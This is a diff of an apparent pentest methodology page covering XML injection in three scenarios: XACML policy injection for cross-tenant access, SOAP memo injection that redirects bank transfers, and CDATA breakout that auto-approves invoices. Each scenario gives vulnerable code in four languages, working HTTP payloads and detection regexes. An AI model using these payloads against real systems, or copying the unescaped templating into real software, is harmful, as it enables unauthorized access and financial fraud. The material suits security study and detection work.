@@ -123,25 +123,25 @@ Send a request to the global administrative dashboard. The PEP evaluates the act
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
+\b(?:policyXml\s*\+=\s*.*<AttributeValue>|StringBuilder[\s\S]{0,150}<Rule\b|XDocument\.Parse[\s\S]{0,120}?\+|XmlWriter[\s\S]{0,120}?(?:WriteElementString|WriteRaw)|string\.Format\s*\(.*<Policy|string\.Format\s*\(.*<Rule)
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
+\b(?:String\.format\s*\(.*<Rule\b|StringBuilder[\s\S]{0,150}<Policy\b|DocumentBuilderFactory|TransformerFactory|setTextContent\s*\(|createElement\s*\("AttributeValue"\))
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
+\b(?:sprintf\s*\(.*<Target>.*%s|DOMDocument|SimpleXMLElement|XMLWriter|str_replace\s*\(.*<AttributeValue>|preg_replace\s*\(.*<Rule)
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
+\b(?:xacmlTemplate\.replace\s*\(/\{\{.*\}\}/g|xmlbuilder|xml2js|builder\.ele\s*\(|replace\s*\(/\{\{ResourceName\}\}/|`[\s\S]*<Policy[\s\S]*\$\{)
 ```
 {% endtab %}
 {% endtabs %}
@@ -151,25 +151,25 @@ Send a request to the global administrative dashboard. The PEP evaluates the act
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
+policyXml\s*\+=\s*.*<AttributeValue>|StringBuilder.*<Rule|string\.Format\(.*<Policy|string\.Format\(.*<Rule
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
+String\.format\(.*<Rule|StringBuilder.*<Policy|createElement\("AttributeValue"
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
+sprintf\(.*<Target>.*%s|DOMDocument|SimpleXMLElement|XMLWriter
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
+xacmlTemplate\.replace\(/\{\{ResourceName\}\}/g|builder\.ele\(|`.*<Policy.*\$\{
 ```
 {% endtab %}
 {% endtabs %}
@@ -179,24 +179,34 @@ filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class SamlProvisioningService 
+public class XacmlPolicyCompiler 
 {
-    private readonly LdapConnection _ldapConnection;
+    private readonly IPolicyPublisher _publisher;
 
-    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
+    public async Task CompileAndPublishAsync(TenantPolicyDto request) 
     {
         // [1]
-        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");
-
         // [2]
         // [3]
-        // [4]
-        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
-        
-        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
-        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);
+        var xacmlPolicy = $@"
+            <Policy PolicyId='Policy_{request.TenantId}' RuleCombiningAlgId='urn:oasis:names:tc:xacml:1.0:rule-combining-algorithm:permit-overrides'>
+                <Target/>
+                <Rule RuleId='Rule_1' Effect='Permit'>
+                    <Target>
+                        <AnyOf>
+                            <AllOf>
+                                <Match MatchId='urn:oasis:names:tc:xacml:1.0:function:string-equal'>
+                                    <AttributeDesignator AttributeId='urn:oasis:names:tc:xacml:1.0:resource:resource-id' DataType='http://www.w3.org/2001/XMLSchema#string'/>
+                                    <AttributeValue DataType='http://www.w3.org/2001/XMLSchema#string'>{request.ResourceName}</AttributeValue>
+                                </Match>
+                            </AllOf>
+                        </AnyOf>
+                    </Target>
+                </Rule>
+            </Policy>";
 
-        return ExtractRolesFromLdapResponse(response);
+        // [4]
+        await _publisher.DistributeToEdgeGatewaysAsync(xacmlPolicy);
     }
 }
 ```
@@ -205,26 +215,36 @@ public class SamlProvisioningService
 {% tab title="Java" %}
 ```java
 @Service
-public class SamlProvisioningService {
+public class XacmlPolicyCompiler {
 
     @Autowired
-    private LdapTemplate ldapTemplate;
+    private PolicyPublisher publisher;
 
-    public List<String> hydrateUserRoles(SamlAssertion assertion) {
+    public void compileAndPublish(TenantPolicyDto request) {
         // [1]
-        String departmentClaim = assertion.getAttribute("Department");
-
         // [2]
         // [3]
-        // [4]
-        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
-        
-        List<String> roles = ldapTemplate.search(
-            query().base("DC=enterprise,DC=local").filter(searchFilter),
-            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
+        String xacmlPolicy = String.format(
+            "<Policy PolicyId='Policy_%s' RuleCombiningAlgId='urn:oasis:names:tc:xacml:1.0:rule-combining-algorithm:permit-overrides'>\n" +
+            "    <Target/>\n" +
+            "    <Rule RuleId='Rule_1' Effect='Permit'>\n" +
+            "        <Target>\n" +
+            "            <AnyOf>\n" +
+            "                <AllOf>\n" +
+            "                    <Match MatchId='urn:oasis:names:tc:xacml:1.0:function:string-equal'>\n" +
+            "                        <AttributeDesignator AttributeId='urn:oasis:names:tc:xacml:1.0:resource:resource-id' DataType='http://www.w3.org/2001/XMLSchema#string'/>\n" +
+            "                        <AttributeValue DataType='http://www.w3.org/2001/XMLSchema#string'>%s</AttributeValue>\n" +
+            "                    </Match>\n" +
+            "                </AllOf>\n" +
+            "            </AnyOf>\n" +
+            "        </Target>\n" +
+            "    </Rule>\n" +
+            "</Policy>", 
+            request.getTenantId(), request.getResourceName()
         );
 
-        return roles;
+        // [4]
+        publisher.distributeToEdgeGateways(xacmlPolicy);
     }
 }
 ```
@@ -232,24 +252,36 @@ public class SamlProvisioningService {
 
 {% tab title="PHP" %}
 ```php
-class SamlProvisioningService 
+class XacmlPolicyCompiler 
 {
-    protected $ldapConnection;
+    protected $publisher;
 
-    public function hydrateUserRoles(SamlAssertion $assertion): array 
+    public function compileAndPublish(TenantPolicyDto $request): void 
     {
         // [1]
-        $departmentClaim = $assertion->getAttribute('Department');
-
         // [2]
         // [3]
-        // [4]
-        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
-        
-        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
-        $entries = ldap_get_entries($this->ldapConnection, $search);
+        $xacmlPolicy = sprintf("
+            <Policy PolicyId='Policy_%s' RuleCombiningAlgId='urn:oasis:names:tc:xacml:1.0:rule-combining-algorithm:permit-overrides'>
+                <Target/>
+                <Rule RuleId='Rule_1' Effect='Permit'>
+                    <Target>
+                        <AnyOf>
+                            <AllOf>
+                                <Match MatchId='urn:oasis:names:tc:xacml:1.0:function:string-equal'>
+                                    <AttributeDesignator AttributeId='urn:oasis:names:tc:xacml:1.0:resource:resource-id' DataType='http://www.w3.org/2001/XMLSchema#string'/>
+                                    <AttributeValue DataType='http://www.w3.org/2001/XMLSchema#string'>%s</AttributeValue>
+                                </Match>
+                            </AllOf>
+                        </AnyOf>
+                    </Target>
+                </Rule>
+            </Policy>", 
+            $request->tenantId, $request->resourceName
+        );
 
-        return $this->extractRoles($entries);
+        // [4]
+        $this->publisher->distributeToEdgeGateways($xacmlPolicy);
     }
 }
 ```
@@ -257,30 +289,30 @@ class SamlProvisioningService
 
 {% tab title="Node.js" %}
 ```javascript
-class SamlProvisioningService {
-    static async hydrateUserRoles(assertion) {
+class XacmlPolicyCompiler {
+    static async compileAndPublish(request) {
         // [1]
-        let departmentClaim = assertion.attributes['Department'];
-
         // [2]
         // [3]
+        let xacmlPolicy = `
+            <Policy PolicyId='Policy_${request.tenantId}' RuleCombiningAlgId='urn:oasis:names:tc:xacml:1.0:rule-combining-algorithm:permit-overrides'>
+                <Target/>
+                <Rule RuleId='Rule_1' Effect='Permit'>
+                    <Target>
+                        <AnyOf>
+                            <AllOf>
+                                <Match MatchId='urn:oasis:names:tc:xacml:1.0:function:string-equal'>
+                                    <AttributeDesignator AttributeId='urn:oasis:names:tc:xacml:1.0:resource:resource-id' DataType='http://www.w3.org/2001/XMLSchema#string'/>
+                                    <AttributeValue DataType='http://www.w3.org/2001/XMLSchema#string'>${request.resourceName}</AttributeValue>
+                                </Match>
+                            </AllOf>
+                        </AnyOf>
+                    </Target>
+                </Rule>
+            </Policy>`;
+
         // [4]
-        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;
-
-        let opts = {
-            filter: searchFilter,
-            scope: 'sub',
-            attributes: ['memberOf']
-        };
-
-        return new Promise((resolve, reject) => {
-            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
-                let roles = [];
-                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
-                res.on('end', () => resolve(roles));
-                res.on('error', (err) => reject(err));
-            });
-        });
+        await publisher.distributeToEdgeGateways(xacmlPolicy);
     }
 }
 ```
@@ -289,92 +321,124 @@ class SamlProvisioningService {
 {% endstep %}
 
 {% step %}
+\[1] The Policy Administration Point (PAP) receives the lightweight JSON DTO from the frontend SPA, \[2] The microservice utilizes a `permit-overrides` combining algorithm, which dictates that if _any_ rule evaluates to `Permit`, the entire policy yields a `Permit` decision regardless of subsequent `Deny` rules, \[3] To optimize performance and memory overhead, the developer dynamically generates the verbose XACML document using raw string interpolation instead of an XML DOM builder, fundamentally failing to XML-entity encode the user-controlled `ResourceName` property, \[4] The poisoned XML structure is synchronized to the Edge Gateways. Because the document remains syntactically valid XML, the distributed caching tier and edge PDPs ingest it flawlessly, deploying the attacker's injected authorization rules organization-wide=
 
+```http
+// 1. Attacker (Tenant Admin for Org_A) configures a custom resource role via JSON API.
+// 2. Attacker injects XML structural elements to break out of the target match and generate a Permit rule for global resources.
+POST /api/v1/policies/custom-roles HTTP/1.1
+Host: pap.enterprise.tld
+Authorization: Bearer <tenant_a_admin_token>
+Content-Type: application/json
+
+{
+  "tenantId": "Org_A",
+  "resourceName": "Billing_Reports</AttributeValue></Match></AllOf></AnyOf></Target></Rule><Rule RuleId='Injected_Rule' Effect='Permit'><Target><AnyOf><AllOf><Match MatchId='urn:oasis:names:tc:xacml:1.0:function:string-equal'><AttributeDesignator AttributeId='urn:oasis:names:tc:xacml:1.0:resource:resource-id' DataType='http://www.w3.org/2001/XMLSchema#string'/><AttributeValue DataType='http://www.w3.org/2001/XMLSchema#string'>Global_System_Config"
+}
+```
+
+```http
+// 3. The PAP compiles the XML and distributes it.
+// 4. The Attacker queries the global system configuration.
+GET /api/v1/admin/global-system-config HTTP/1.1
+Host: gateway.enterprise.tld
+Authorization: Bearer <tenant_a_admin_token>
+
+// 5. The PEP evaluates the policy, hits the injected <Rule Effect='Permit'> for the target resource, and grants access.
+HTTP/1.1 200 OK
+{"status": "Global Config Data"}
+```
 {% endstep %}
 
 {% step %}
-
+To support complex Attribute-Based Access Control (ABAC) without incurring the performance penalty of constructing massive XML Abstract Syntax Trees in memory, the authorization engineers implemented string-templated XACML compilation. By assuming that JSON string fields represented semantic plain text, the architecture bypassed XML contextual encoding. The attacker supplied a payload containing strictly valid XML syntax that closed the active `<Rule>` block and initiated a subsequent, highly privileged `Permit` block. The system perfectly serialized this payload into the authoritative XACML document. When the distributed Policy Enforcement Points consumed the document, the injected XML structure was parsed natively, resulting in a systemic collapse of cross-tenant and platform isolation
 {% endstep %}
 {% endstepper %}
 
 ***
 
+#### Financial Routing Fraud via BFF REST-to-SOAP Translation Overlap
+
 {% stepper %}
 {% step %}
-
+Map the entire target system using Burp Suite. Pay attention to specific API routes that handle core financial transactions, wire transfers, or massive batch processing
 {% endstep %}
 
 {% step %}
-
+Draw the application's architecture and trust boundaries inside XMind
 {% endstep %}
 
 {% step %}
-
+Decompile or reverse engineer the application according to the underlying technology stack
 {% endstep %}
 
 {% step %}
-
+Identify a Backend-For-Frontend (BFF) proxy architecture. Modern mobile apps and web SPAs communicate via REST/JSON. However, mission-critical financial systems (e.g., Core Banking Mainframes, SAP ERPs) remain firmly rooted in legacy XML-based SOAP protocols
 {% endstep %}
 
 {% step %}
-
+Investigate the BFF translation layer. The BFF acts as an anti-corruption layer, ingesting the inbound JSON request and mapping it to the rigid SOAP XML envelope expected by the legacy mainframe
 {% endstep %}
 
 {% step %}
-
+Discover the high-throughput translation optimization. Instantiating complex XML serializers (`JAXB`, `XmlSerializer`) for thousands of concurrent transactions creates unacceptable garbage collection pauses. To minimize latency, developers construct the outbound SOAP payload using direct string concatenation
 {% endstep %}
 
 {% step %}
-
+Analyze the parameter mapping. Note that highly constrained fields (like `Amount`, `Currency`, and `DestinationAccount`) are usually securely type-cast (e.g., converting a JSON number to an Integer)
 {% endstep %}
 
 {% step %}
-
+Identify a free-text metadata field, such as `TransactionMemo`, `ReferenceNote`, or `Description`, that maps natively as a String
 {% endstep %}
 
 {% step %}
-
+Understand the legacy XML parser's behavior. Most legacy SOAP parsers process duplicate XML nodes sequentially. If an XML payload contains two identically named nodes within the same parent (e.g., `<DestinationAccount>Account_A</DestinationAccount> ... <DestinationAccount>Account_B</DestinationAccount>`), the parser inherently assigns the _last_ defined node to the DTO property, silently discarding the first
 {% endstep %}
 
 {% step %}
-
+Send a legitimate JSON transfer request to the BFF
 {% endstep %}
 
 {% step %}
-
+Inject an XML payload into the free-text `Memo` field. The payload must close the `<Memo>` tag early, inject a duplicate, high-value node (e.g., `<DestinationAccount>Attacker_Account</DestinationAccount>`), and reopen a `<Memo>` tag so the resulting XML remains perfectly well-formed
 {% endstep %}
 
 {% step %}
-
+The BFF's JSON parser validates the payload structurally, confirms the `DestinationAccount` matches your authorized payee list, and string-interpolates your `Memo` into the SOAP envelope
 {% endstep %}
 
 {% step %}
+The legacy mainframe receives the XML. It parses the first `DestinationAccount` (authorized), parses the broken `Memo`, and parses the newly injected `DestinationAccount` (attacker)
+{% endstep %}
 
+{% step %}
+Because the attacker's node appears chronologically later in the DOM tree, the legacy deserializer overwrites the internal state variable. The financial transaction is mathematically authorized but executed against the injected routing parameters
 
 **VSCode Regex Detection**
 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
+\b(?:soapEnvelope\s*\+=\s*.*<Memo>|StringBuilder[\s\S]{0,150}<Envelope\b|XDocument[\s\S]{0,120}?\+|XmlWriter[\s\S]{0,120}?(?:WriteElementString|WriteRaw)|string\.Format\s*\(.*<Memo>|string\.Format\s*\(.*<Envelope>)
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
+\b(?:String\.format\s*\(.*<Memo>%s|StringBuilder[\s\S]{0,150}<Envelope\b|SOAPMessage|SOAPBody|DocumentBuilderFactory|TransformerFactory|setTextContent\s*\(|createElement\s*\("Memo"\))
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
+\b(?:\$soapBody\s*\.\=\s*".*<Memo>|\bsprintf\s*\(.*<Memo>%s|DOMDocument|SimpleXMLElement|XMLWriter|SoapClient|SoapVar)
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
+\b(?:xmlPayload\s*\+=\s*`<Memo>\$\{|`[\s\S]*<Envelope[\s\S]*\$\{|xmlbuilder|fast-xml-parser|builder\.ele\s*\(|replace\s*\(/\{\{.*\}\}/)
 ```
 {% endtab %}
 {% endtabs %}
@@ -384,25 +448,25 @@ class SamlProvisioningService {
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
+soapEnvelope\s*\+=\s*.*<Memo>|StringBuilder.*<Envelope|string\.Format\(.*<Memo>|string\.Format\(.*<Envelope>
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
+String\.format\(.*<Memo>%s|StringBuilder.*<Envelope|SOAPBody|createElement\("Memo"
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
+\$soapBody\s*\.\=\s*".*<Memo>|sprintf\(.*<Memo>%s|SoapClient|SoapVar
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
+xmlPayload\s*\+=\s*`<Memo>\$\{|`.*<Envelope.*\$\{|builder\.ele\(
 ```
 {% endtab %}
 {% endtabs %}
@@ -412,24 +476,32 @@ filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class SamlProvisioningService 
+public class MainframeSoapClient 
 {
-    private readonly LdapConnection _ldapConnection;
+    private readonly HttpClient _httpClient;
 
-    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
+    public async Task<string> ExecuteTransferAsync(TransferRequestDto request) 
     {
         // [1]
-        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");
-
         // [2]
         // [3]
-        // [4]
-        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
-        
-        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
-        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);
+        var soapEnvelope = $@"<?xml version='1.0' encoding='utf-8'?>
+            <soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>
+                <soap:Body>
+                    <ExecuteTransfer>
+                        <SourceAccount>{request.SourceAccount}</SourceAccount>
+                        <DestinationAccount>{request.DestinationAccount}</DestinationAccount>
+                        <Amount>{request.Amount}</Amount>
+                        <Memo>{request.Memo}</Memo>
+                    </ExecuteTransfer>
+                </soap:Body>
+            </soap:Envelope>";
 
-        return ExtractRolesFromLdapResponse(response);
+        // [4]
+        var content = new StringContent(soapEnvelope, Encoding.UTF8, "text/xml");
+        var response = await _httpClient.PostAsync("http://mainframe.internal.corp/TransferService", content);
+        
+        return await response.Content.ReadAsStringAsync();
     }
 }
 ```
@@ -438,26 +510,36 @@ public class SamlProvisioningService
 {% tab title="Java" %}
 ```java
 @Service
-public class SamlProvisioningService {
+public class MainframeSoapClient {
 
     @Autowired
-    private LdapTemplate ldapTemplate;
+    private RestTemplate restTemplate;
 
-    public List<String> hydrateUserRoles(SamlAssertion assertion) {
+    public String executeTransfer(TransferRequestDto request) {
         // [1]
-        String departmentClaim = assertion.getAttribute("Department");
-
         // [2]
         // [3]
-        // [4]
-        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
-        
-        List<String> roles = ldapTemplate.search(
-            query().base("DC=enterprise,DC=local").filter(searchFilter),
-            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
+        String soapEnvelope = String.format(
+            "<?xml version='1.0' encoding='utf-8'?>\n" +
+            "<soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>\n" +
+            "    <soap:Body>\n" +
+            "        <ExecuteTransfer>\n" +
+            "            <SourceAccount>%s</SourceAccount>\n" +
+            "            <DestinationAccount>%s</DestinationAccount>\n" +
+            "            <Amount>%f</Amount>\n" +
+            "            <Memo>%s</Memo>\n" +
+            "        </ExecuteTransfer>\n" +
+            "    </soap:Body>\n" +
+            "</soap:Envelope>",
+            request.getSourceAccount(), request.getDestinationAccount(), request.getAmount(), request.getMemo()
         );
 
-        return roles;
+        // [4]
+        HttpHeaders headers = new HttpHeaders();
+        headers.setContentType(MediaType.TEXT_XML);
+        HttpEntity<String> entity = new HttpEntity<>(soapEnvelope, headers);
+
+        return restTemplate.postForObject("http://mainframe.internal.corp/TransferService", entity, String.class);
     }
 }
 ```
@@ -465,24 +547,35 @@ public class SamlProvisioningService {
 
 {% tab title="PHP" %}
 ```php
-class SamlProvisioningService 
+class MainframeSoapClient 
 {
-    protected $ldapConnection;
-
-    public function hydrateUserRoles(SamlAssertion $assertion): array 
+    public function executeTransfer(TransferRequestDto $request): string 
     {
         // [1]
-        $departmentClaim = $assertion->getAttribute('Department');
-
         // [2]
         // [3]
-        // [4]
-        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
-        
-        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
-        $entries = ldap_get_entries($this->ldapConnection, $search);
+        $soapEnvelope = "<?xml version='1.0' encoding='utf-8'?>
+            <soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>
+                <soap:Body>
+                    <ExecuteTransfer>
+                        <SourceAccount>{$request->sourceAccount}</SourceAccount>
+                        <DestinationAccount>{$request->destinationAccount}</DestinationAccount>
+                        <Amount>{$request->amount}</Amount>
+                        <Memo>{$request->memo}</Memo>
+                    </ExecuteTransfer>
+                </soap:Body>
+            </soap:Envelope>";
 
-        return $this->extractRoles($entries);
+        // [4]
+        $ch = curl_init('http://mainframe.internal.corp/TransferService');
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $soapEnvelope);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: text/xml']);
+
+        $response = curl_exec($ch);
+        curl_close($ch);
+
+        return $response;
     }
 }
 ```
@@ -490,30 +583,29 @@ class SamlProvisioningService
 
 {% tab title="Node.js" %}
 ```javascript
-class SamlProvisioningService {
-    static async hydrateUserRoles(assertion) {
+class MainframeSoapClient {
+    static async executeTransfer(request) {
         // [1]
-        let departmentClaim = assertion.attributes['Department'];
-
         // [2]
         // [3]
+        let soapEnvelope = `<?xml version='1.0' encoding='utf-8'?>
+            <soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>
+                <soap:Body>
+                    <ExecuteTransfer>
+                        <SourceAccount>${request.sourceAccount}</SourceAccount>
+                        <DestinationAccount>${request.destinationAccount}</DestinationAccount>
+                        <Amount>${request.amount}</Amount>
+                        <Memo>${request.memo}</Memo>
+                    </ExecuteTransfer>
+                </soap:Body>
+            </soap:Envelope>`;
+
         // [4]
-        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;
-
-        let opts = {
-            filter: searchFilter,
-            scope: 'sub',
-            attributes: ['memberOf']
-        };
-
-        return new Promise((resolve, reject) => {
-            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
-                let roles = [];
-                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
-                res.on('end', () => resolve(roles));
-                res.on('error', (err) => reject(err));
-            });
+        let response = await axios.post('http://mainframe.internal.corp/TransferService', soapEnvelope, {
+            headers: { 'Content-Type': 'text/xml' }
         });
+
+        return response.data;
     }
 }
 ```
@@ -522,92 +614,131 @@ class SamlProvisioningService {
 {% endstep %}
 
 {% step %}
+\[1] The BFF acts as a translation layer, securely validating business rules (e.g., sufficient funds, authorized recipient) based on the incoming JSON structure before initiating communication with the legacy environment, \[2] To avoid the serialization latency of heavy XML libraries, the developer implements string interpolation to build the SOAP envelope, \[3] The architecture relies entirely on the JSON parser's inherent structural safety. The developer assumes that because a JSON string is logically plain text, it will remain inert when transplanted into the XML DOM, \[4] The unescaped payload is beamed across the internal WAN. The legacy system's SOAP parser processes the document linearly. By injecting a duplicate `<DestinationAccount>` node after the original, the attacker exploits the parser's state-machine implementation (which natively overwrites duplicate key assignments), forcing the mainframe to execute the transaction against the injected routing logic
 
+```http
+// 1. Attacker sends a JSON request to the modern BFF. 
+// They specify an authorized destination account to pass the business logic checks.
+// They inject the XML Structural payload into the free-text Memo field.
+POST /api/v1/banking/transfer HTTP/1.1
+Host: bff.enterprise.tld
+Authorization: Bearer <attacker_token>
+Content-Type: application/json
+
+{
+  "sourceAccount": "123456789",
+  "destinationAccount": "AUTHORIZED_PAYEE_99",
+  "amount": 50000.00,
+  "memo": "</Memo><DestinationAccount>ATTACKER_OFFSHORE_ACCOUNT</DestinationAccount><Memo>Payment"
+}
+
+// 2. The BFF evaluates the JSON request, verifies AUTHORIZED_PAYEE_99, and builds the SOAP string:
+// <DestinationAccount>AUTHORIZED_PAYEE_99</DestinationAccount>
+// <Amount>50000.00</Amount>
+// <Memo></Memo><DestinationAccount>ATTACKER_OFFSHORE_ACCOUNT</DestinationAccount><Memo>Payment</Memo>
+
+// 3. The Mainframe XML deserializer parses the document. The second DestinationAccount overwrites the first.
+// 4. The funds are successfully routed to the attacker's offshore account.
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"status": "Transfer Successful"}
+```
 {% endstep %}
 
 {% step %}
-
+To bridge modern JSON frontends with legacy XML mainframes, the Backend-For-Frontend proxy bypassed heavy XML serialization libraries in favor of rapid string templating. The architecture validated the transaction parameters against the JSON structure and blindly mapped them into the SOAP template. By providing a valid destination account, the attacker satisfied the BFF's compliance logic. However, by embedding XML structural tags within the `Memo` field, the attacker manipulated the downstream XML Document Object Model. The legacy mainframe parsed the document sequentially, encountering a duplicate account routing node. Utilizing a standard last-node-wins resolution strategy, the mainframe discarded the validated destination and executed the financial transfer against the attacker's injected parameter, demonstrating a critical execution bypass resulting purely from protocol translation desynchronization
 {% endstep %}
 {% endstepper %}
 
 ***
 
+#### Supply Chain Approval Bypass via CDATA Breakout in Event Sourcing Pipelines
+
 {% stepper %}
 {% step %}
-
+Map the entire target system using Burp Suite. Focus on asynchronous B2B integration points, such as Invoice ingestion, Supply Chain management, or Compliance Auditing modules
 {% endstep %}
 
 {% step %}
-
+Draw the application's architecture and trust boundaries inside XMind
 {% endstep %}
 
 {% step %}
-
+Decompile or reverse engineer the application according to the underlying technology stack
 {% endstep %}
 
 {% step %}
-
+Identify an Event Sourcing microservice architecture utilizing standardized B2B messaging schemas (e.g., UBL - Universal Business Language, or Peppol)
 {% endstep %}
 
 {% step %}
-
+Investigate the API Gateway webhook ingestion. Vendors submit invoices via a modern REST/JSON API. The API Gateway validates the payload, transforms it into the mandatory XML format, and drops it onto an internal message broker (RabbitMQ, Kafka) for asynchronous processing by the core Accounting engine
 {% endstep %}
 
 {% step %}
-
+Analyze the JSON-to-XML translation optimization in the API Gateway. To ensure the XML parser in the downstream Accounting engine does not throw fatal exceptions when a vendor includes HTML characters (e.g., `&`, `<`, `>`) in a rich-text justification field, the API Gateway explicitly wraps specific fields in `<![CDATA[ ... ]]>` blocks
 {% endstep %}
 
 {% step %}
-
+Understand the hidden assumption of CDATA blocks. Developers falsely assume that CDATA blocks perfectly neutralize any content within them, rendering all injected tags inert
 {% endstep %}
 
 {% step %}
-
+Discover the structural limitation: The XML specification states that a CDATA section cannot contain the string `]]>`. If the string `]]>` is encountered, the parser instantly terminates the CDATA block and resumes standard XML parsing for the subsequent text
 {% endstep %}
 
 {% step %}
-
+Locate the exact translation routine in the decompiled API Gateway. Verify that the developer did not implement a pre-processing step to sanitize or escape the `]]>` sequence from the user's input before wrapping it
 {% endstep %}
 
 {% step %}
-
+Send a JSON webhook payload to the API Gateway
 {% endstep %}
 
 {% step %}
-
+Inside a CDATA-wrapped field (like `justification_note` or `description`), inject the CDATA termination sequence followed by a highly privileged business logic node: `]]><IsApproved>true</IsApproved><RequiresAudit>false</RequiresAudit><![CDATA[`
 {% endstep %}
 
 {% step %}
-
+The API Gateway wraps your payload: `<![CDATA[]]><IsApproved>true</IsApproved><RequiresAudit>false</RequiresAudit><![CDATA[]]>`
 {% endstep %}
 
 {% step %}
+The generated XML document remains structurally flawless. The Gateway pushes it onto the message queue
+{% endstep %}
 
+{% step %}
+The core Accounting engine pulls the XML message. The parser consumes the first empty CDATA block, natively processes your injected `<IsApproved>` and `<RequiresAudit>` nodes, and consumes the final empty CDATA block
+{% endstep %}
+
+{% step %}
+The system inherently trusts the parsed values, bypassing the manual managerial review queues, and schedules the multi-million dollar invoice for automated payout
 
 **VSCode Regex Detection**
 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
